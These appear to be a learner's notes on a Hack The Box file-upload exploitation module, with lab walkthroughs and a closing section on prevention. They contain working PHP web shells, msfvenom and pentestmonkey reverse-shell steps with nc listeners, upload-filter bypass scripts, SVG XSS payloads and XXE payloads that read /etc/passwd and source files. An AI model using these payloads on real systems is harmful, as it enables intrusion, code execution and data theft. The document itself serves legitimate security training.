
## Basic Exploitation
#### Absent Validation
```
## Arbitrary File Uploads
- Found a web application that allows any type of upload. 
- Upload webshell

## Identifying Web Framework
- Use of tools like Wappalayzer (can also ref to infrastrucuture enum section in information gathering- web edition)

## Vulnerability Identification
- Create a basic Hello World script an upload it <?php echo "Hello HTB";?> to test.php and upload it to the web application.

## Questions
Q1: Try to upload a PHP script that executes the (hostname) command on the back-end server, and submit the first word of it as the answer.
 -Follow the section and upload:
echo "<?php system('hostname');?>"  > test1.php 
 
 - Click download file and get flag.
```

#### Upload Exploitation
```
## Web Shells
- Uploading useful web shells to the directory once we identify the language of the web server

## Writing Custom Web Shell
- Writing a simple webshell and name it shell.php
<?php system($_REQUEST['cmd']); ?>

**Tip:** If we are using this custom web shell in a browser, it may be best to use source-view by clicking `[CTRL+U]`, as the source-view shows the command output as it would be shown in the terminal, without any HTML rendering that may affect how the output is formatted.

- Webshell for .NET web applications
<% eval request('cmd') %>

## Reverse Shells
- Use a reverse shell like php-reverse-shell.php by pentestmonkey

- E.g.: Change the following on lines 49/50:
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS

- Catching reverse shell
areaeric@htb[/htb]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

## Generating Custom Reverse Shell Scripts
- Use of msfvenom
areaeric@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php

- Catching reverse shell after upload and execution:
areaeric@htb[/htb]$ nc -lvnp OUR_PORT

## Quesions
Q1: Try to exploit the upload feature to upload a web shell and get the content of /flag.txt

- We write with out simple web shell:
<?php system($_REQUEST['cmd']); ?> as shell.php

	-> Get location of webshell through clicking on download file:

 - get flag
http://83.136.254.223:59249/uploads/shell.php?cmd=cat%20/flag.txt
```

## Bypassing Filters
#### Client-Side Validation
```
## Client-Side Validation
- Client-side blocking the upload of file.

- We can manipulate front-end code to bypass these type validations or modify the upload request to the back-end server

## Back-end Request Modification
- Use Burp, intercept the image (proper input) and change the filename to .php and content type to our payload (webshell).

**Note:** We may also modify the `Content-Type` of the uploaded file, though this should not play an important role at this stage, so we'll keep it unmodified.

## Disabling Front-end validation
- [CTRL+SHIFT+C] to toggle the browser's Page Inspector and look for related code:
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">

- Check Javascript file ([CTRL+SHIFT+K] and type checkFile)
function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}

- Remove the function to bypass front-end validation.

**Tip:** You may also do the same to remove `accept=".jpg,.jpeg,.png"`, which should make selecting the `PHP` shell easier in the file selection dialog, though this is not mandatory, as mentioned earlier.

**Note:** The modification we made to the source code is temporary and will not persist through page refreshes, as we are only changing it on the client-side. However, our only need is to bypass the client-side validation, so it should be enough for this purpose

- We can check the location of the shell (profile image) after uploading through [CTRL+SHIFT+C] and clicking on the profile image.

**Note:** The steps shown apply to Firefox, as other browsers may have slightly different methods for applying local changes to the source, like the use of `overrides` in Chrome

## Questions
- Identify a file upload functionality with server side validation.

- Follow section for back-end request modification and disable front-end validation to achieve the goal.

- Identify image location in the inspector

- Get flag:
http://94.237.54.170:51449/profile_images/shell.php?cmd=ls%20/
```

#### Blacklist Filters
```
## Blacklisting Extensions
- Example code of extension blacklist:
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}

**Tip:** The comparison above is also case-sensitive, and is only considering lowercase extensions. In Windows Servers, file names are case insensitive, so we may try uploading a `php` with a mixed-case (e.g. `pHp`), which may bypass the blacklist as well, and should still execute as a PHP script.


## Fuzzing Extensions
- Fuzz for allowed extension using burp intruder  (just fuzz the filename) on a normal image, using wordlist from Sec
/opt/SecLists/Discovery/Web-Content/web-extensions.txt 

- Load the PHP extensions list on payload page and untick url encoding

## Non-Blacklisted Extensions
- Upload a file (through burp repeater) with extension not blocked by the server and can run code (php shell code)
	-> E.g. is .phtml extension in php 


## Questions
- Saw a page with upload functionality and fuzzed with extension with burp.
	-> Obtained the following valid extensions:
	php2, php3, php4, php6, .pht, .pl, .phar

- Based on knowledge given ini file inclusion, it seems like .phar could execute file, let's try sendiing that to repeater with a shell and accessing it.
	-> To find the location of the uploaded file, we assume it's the same as the exercises last section. 
	-> testing for execution: http://94.237.49.166:52254/profile_images/test.phar?cmd=id
		-> worked

- Obtain flag
http://94.237.49.166:52254/profile_images/test.phar?cmd=cat%20/flag.txt

- Alternative method: Execute hello world on the php script to see whether it executes code:
<?php echo 'Hello, World!'; ?>
```

#### Whitelist Filters
```
## Whitelisting Extensions
- Only specific extensions are allowed, often denoted by the message we receive (e.g. only image allowed)
- Example code for performing whitelisting extensions:
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}

## Double Extensions
- Appends an accepted extension and see whether it bypasses the filter (using burp/zap)
	-> Works mostly on outdate system.
	-> E.g. Does not work on the following:
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }

## Reverse Double
- Sometimes it may be the web server configuraton that is vulnerable.
	- E.g. on the /etc/apache2/mods-enabled/php7.4.conf:
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
	-> This would allow shell.php.jpg to execute code (modify request using burp/zap to test)

## Character Injection
- Inject special characters and write a script for non-blacklisted extension.
	-> E.g. script:
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

	replacing .php, .phps with other non-blacklisted extension. 

## Workflow:
- The workflow would be like this (mix of metrics based on likelihood of success and effort of executing)
	1. Fuzz for non-blacklisted extension using reverse double
	2. Examine results from reverse double for quick wins
	3. Fuzz for double extensions and examine results
	4. Perform character injection

## Questions
- We saw an upload functionality with client-side, blacklist and whitelist test.
- Client side we can bypass with burp modification.

- We execute the workflow constructued.

-## Reverse double
	-> use the hello world for checking script execution
	<?php echo 'Hello, World!'; ?>
	-> use extension.lst for list of extension we will use and disable url-encoding.

	-> Obtained extension such as .pht, .pgif, .phtm

	-> using zap to test due to burp restriction on speed and some error results.

	-> Obtained .pht, .phar, .pgif, .phtml and .phtm as valid extensions.

	-> Examination of result on reverse double, the location of the file location is profile_images when examining source code after uploading the file: test.pht.png, test.phar.png, test.pgif.png, test.phtml.png

	-> Got a hit test.phar.png

	-> Now writing a shell and getting flag. 
<?php system($_REQUEST['cmd']); ?>

	-> http://94.237.62.149:49764/profile_images/test.phar.png?cmd=cat%20/flag.txt

## Extras:
- Double extension technique all failed, as expected as it is only used for outdated system.

-## Chracter extension:
	-> Script:
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.phtml' '.phar' '.pht' '.phtm' '.pgif'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

	-> Fuzzing (using <?php echo 'Hello, World!'; ?> as post content) through ZAP using wordlist

	-> Checking for which page actually got a hit using Ffuf:
ffuf -w wordlist.txt:FUZZ -u http://94.237.62.149:49764/profile_images/FUZZ
		-> fs=31
ffuf -w wordlist.txt:FUZZ -u http://94.237.62.149:49764/profile_images/FUZZ -fs 31

-> shell.phar..jpg, shell.phtml..jpg and shell.phar:.jpg all bypassed the filters. 

In total, we have at least 4 solutions that could bypass the filters.
```

#### Type Filters
```
## Content-Type
- Web applications may look at the Content-Type header to validate the file type:
- Example PHP code:
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}

- wordlist:
areaeric@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt
areaeric@htb[/htb]$ cat content-type.txt | grep 'image/' > image-content-types.txt


- We can fuzz using the wordlist /opt/SecLists/Miscellaneous/web/content-type.txt to see what content-type is allowed.

- We can bypass the filter by fuzzing for accepted content-type and modifying our request through burp/zap 

**Note:** A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as `POST` data), in which case we will need to modify the main Content-Type header.

## MIME-Type
- It is like a magic byte (first few bytes) of a file

**Tip:** Many other image types have non-printable bytes for their file signatures, while a `GIF` image starts with ASCII printable bytes (as shown above), so it is the easiest to imitate. Furthermore, as the string `GIF8` is common between both GIF signatures, it is usually enough to imitate a GIF image.

- e.g. Creating a text file and identify its MIME type
areaeric@htb[/htb]$ echo "this is a text file" > text.jpg 
areaeric@htb[/htb]$ file text.jpg 
text.jpg: ASCII text

- Using magic bytes of GIF on an jpg file extension
areaeric@htb[/htb]$ echo "GIF8" > text.jpg 
areaeric@htb[/htb]$file text.jpg
text.jpg: GIF image data

- e.g. How web server identify mime type:
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}

- We can modify the Mime-type through using a proxy like Burp/ZAP through using appropriate magic bytes.

**Note:** We see that the command output starts with `GIF8` , as this was the first line in our PHP script to imitate the GIF magic bytes, and is now outputted as a plaintext before our PHP code is executed.

## Workflow (breakable)
- Bypass client-side validation
- Bypass type filters (Content-type and Mime)


## Questions: 
The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"

- Identified an upload function.


-## Content type
	-> Fuzzed for content type and only have gif,jpeg and png content type accepted.
	-> We will change the content-type using zap.

-## Mime type:
	-> We will start the content using GIF8 (magic bytes) to bypass Mime type filter.


-## We will follow the workflow for white list filtering to bypass blacklist and whitelist filtering. 

-## Reverse double:
	-> use the extension.lst wordlist with content:
	<?php echo 'Hello, World!'; ?>
	
	-> .phar, .pht, .pgif, .phtml, .phtm extension accepted

	-> Examine the results (assume the location of file is same as previously, at profile_images directory)
		e.g. test.phar.png
		-> All failed.

-## Double extension:
	-> use the web-extension.txt wordlist with the same content as reverse double:
	-> .phar, .pht, .pgif, .phtml, .phtm extension accepted
	e.g. test.png.phar
	-> Got a hit on test.png.phar

- Uploading code for rce on test.png.phar and getting flag:
<?php system($_REQUEST['cmd']); ?>
http://94.237.63.83:50433/profile_images/test.png.phar?cmd=cat%20/flag.txt
```

## Other Upload Attacks
#### Limited File Uploads
```
## XSS
- If html upload is allowed, we can perform an XSS attack:
- e.g. of script insertion on comment parameter
areaeric@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
areaeric@htb[/htb]$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>

- We can also carry attacks using .svg extension.
- e.g. Writing XSS payload in XML data:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>

## XXE
- We can read source code of web application or oher internal documents if svg upload is allowed.
- E.g. Reading /etc/passwd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

- E.g. Reading source code in PHP web applications:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>

## DoS
- We can perform binary bombs using XXE payloads, but are out of the scope.

## Questions:
Q1: The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt"

- We first fuzz for extension to see if extension is allowed:

-## Double extension fuzzing (using web-extension.txt) with payload:
<?php echo 'Hello, World!'; ?>
	-> Doesn't allow fuzzing at all, just have to look at whether html or svg is allowed.
	-> We see svg upload allowed.

-> We read the file through first bypassing server side validation:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg>&xxe;</svg>

	-> Reload the page we see the flag (as we are updating the logo).

Q2: Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)


-##XXE, performing source code reading with the following svg (named as read_upload.svg) and upload it

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>

- Refresh the page and read the svg file
curl http://94.237.63.93:35377/ | grep 'svg' > 'upload.php_base64'

- Edit the file, remove space and only keep base64 encoded character and perform decoding
cat upload.php_base64 | base64 -d > upload.php

- Reading upload.php gives the location of target directory.
```

## Preventing File Upload Vulnerabilities
```
## Overview
Throughout this module, we have discussed various methods of exploiting different file upload vulnerabilities.

	-> In any penetration test or bug bounty exercise we take part in, we must be able to report action points to be taken to rectify the identified vulnerabilities.

## Extension Validation

- The first and most common type of upload vulnerabilities we discussed in this module was file extension validation. 
 
	-> File extensions play an important role in how files and scripts are executed, as most web servers and web applications tend to use file extensions to set their execution properties. 
	
	-> This is why we should make sure that our file upload functions can securely handle extension validation.

- While whitelisting extensions is always more secure, as we have seen previously, it is recommended to use both by whitelisting the allowed extensions and blacklisting dangerous extensions. 
 
	-> This way, the blacklist list will prevent uploading malicious scripts if the whitelist is ever bypassed (e.g. `shell.php.jpg`). 
	
	-> The following example shows how this can be done with a PHP web application, but the same concept can be applied to other frameworks:

$fileName = basename($_FILES["uploadFile"]["name"]);

// blacklist test
if (preg_match('/^.+\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// whitelist test
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

- We see that with blacklisted extension, the web application checks `if the extension exists anywhere within the file name`, while with whitelists, the web application checks `if the file name ends with the extension`. 

	-> Furthermore, we should also apply both back-end and front-end file validation. 
	
	-> Even if front-end validation can be easily bypassed, it reduces the chances of users uploading unintended files, thus potentially triggering a defense mechanism and sending us a false alert.

## Content Validation

- As we have also learned in this module, extension validation is not enough, as we should also validate the file content. 
 
	-> We cannot validate one without the other and must always validate both the file extension and its content.
	
	-> Furthermore, we should always make sure that the file extension matches the file's content.

	-> The following example shows us how we can validate the file extension through whitelisting, and validate both the File Signature and the HTTP Content-Type header, while ensuring both of them match our expected file type:

$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// whitelist test
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}

// content test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only SVG images are allowed";
        die();
    }
}

## Upload Disclosure

- Another thing we should avoid doing is disclosing the uploads directory or providing direct access to the uploaded file.
 
	-> It is always recommended to hide the uploads directory from the end-users and only allow them to download the uploaded files through a download page.

- We may write a `download.php` script to fetch the requested file from the uploads directory and then download the file for the end-user.
 
	-> This way, the web application hides the uploads directory and prevents the user from directly accessing the uploaded file.
	
	-> This can significantly reduce the chances of accessing a maliciously uploaded script to execute code.

- If we utilize a download page, we should make sure that the `download.php` script only grants access to files owned by the users (i.e., avoid `IDOR/LFI` vulnerabilities) and that the users do not have direct access to the uploads directory (i.e., `403 error`). 
 
	-> This can be achieved by utilizing the `Content-Disposition` and `nosniff` headers and using an accurate `Content-Type` header.

- In addition to restricting the uploads directory, we should also randomize the names of the uploaded files in storage and store their "sanitized" original names in a database. 
 
	-> When the `download.php` script needs to download a file, it fetches its original name from the database and provides it at download time for the user. 
	
	-> This way, users will neither know the uploads directory nor the uploaded file name. We can also avoid vulnerabilities caused by injections in the file names, as we saw in the previous section.

- Another thing we can do is store the uploaded files in a separate server or container. 
 
	-> If an attacker can gain remote code execution, they would only compromise the uploads server, not the entire back-end server. 
	
	-> Furthermore, web servers can be configured to prevent web applications from accessing files outside their restricted directories by using configurations like (`open_basedir`) in PHP.

## Further Security

- The above tips should significantly reduce the chances of uploading and accessing a malicious file.
 
	-> We can take a few other measures to ensure that the back-end server is not compromised if any of the above measures are bypassed.

- A critical configuration we can add is disabling specific functions that may be used to execute system commands through the web application.
	
	-> For example, to do so in PHP, we can use the `disable_functions` configuration in `php.ini` and add such dangerous functions, like `exec`, `shell_exec`, `system`, `passthru`, and a few others.

- Another thing we should do is to disable showing any system or server errors, to avoid sensitive information disclosure. 
 
	-> We should always handle errors at the web application level and print out simple errors that explain the error without disclosing any sensitive or specific details, like the file name, uploads directory, or the raw errors.

- Finally, the following are a few other tips we should consider for our web applications:

	- Limit file size
	- Update any used libraries
	- Scan uploaded files for malware or malicious strings
	- Utilize a Web Application Firewall (WAF) as a secondary layer of protection

- Once we perform all of the security measures discussed in this section, the web application should be relatively secure and not vulnerable to common file upload threats. 
 
	-> When performing a web penetration test, we can use these points as a checklist and provide any missing ones to the developers to fill any remaining gaps.
```


## Skills Assessment
```
## Questions
- Saw an upload pages during contact us.

- We'll try an upload the image and observe the functionality. 
	-> Uses a script to upload the file, onto function /contact/upload.php
	-> We follow the workflow (breakable) then workflow for file uploading.


-##workflow (breakable)
	-> Bypass client side validation through proper upload
	-> Bypass Mime filters through magic bytes
	GIF8
	
	-> Bypass type filters through Content-Type: image/jpeg

	
	-> Attack didn't quite work. Unsure about content type allowed-> fuzz content type (fuzzing using for image-content-types.txt)
		-> image/svg+xml allowed.

- Performing source code disclosure on /contact/upload.php. 
	-> bypass client side first, through manual deletion (as unsure of what magic byte is required) and allow .svg files. Name the xml as HTB.svg
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=contact/upload.php"> ]>
<svg>&xxe;</svg>

	-> Didn't quite work, so tried reading /etc/passwd:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
-> got passwd results.

	-> try reading again (wrong directory previously)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
	-> got a bunch of base64 response back.

	-> Decoding it gives:
	echo 'bunch of stuff' | base64 -d > upload.php

	-> Reading the upload.php reveals files are located at ./user_feedback_submissions/
		-> Taking a look at uploaded files:
		contact/user_feedback_submissions/240508_test.png

	-> Not too sure with how to continue the attack, so look at ./common-functins.php in the upload.php file. 
		-> Not much help

	-> Reading the file, denoted as common_fuctions.php

- Through examining the source code file, we see that .phar file is not blocked. We will have to perform blacklist and whitelist bypass.


-##workflow
	-> Upload the legitmate picture fuzz the extension using extension.lst wordlist
		-> .phar, .pht, pgif and .phtm are not blacklisted.
trying with payload:<?php echo 'Hello, World!'; ?> , through leaving the first few bits of the special bytes.

	-> Accessing the page to check
	
	contact/user_feedback_submissions/240508_test.pht.png
	contact/user_feedback_submissions/240508_test.pgif.png
	contact/user_feedback_submissions/240508_test.phar.png

	-> reverse double worked on filename test.phar.png with the payload.

	-> Deliver payload on test.phar.png
	<?php system($_REQUEST['cmd']); ?>

	-> final url:
https://94.237.62.149:32958/contact/user_feedback_submissions/240508_test.phar.png?cmd=cat%20/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt



the key takeway:
for mime type of png, just upload it and leave it like this, start the payload after the ;

E.g. payload delivery

PNG
  
  
IHDR;<?php system($_REQUEST['cmd']); ?>
```


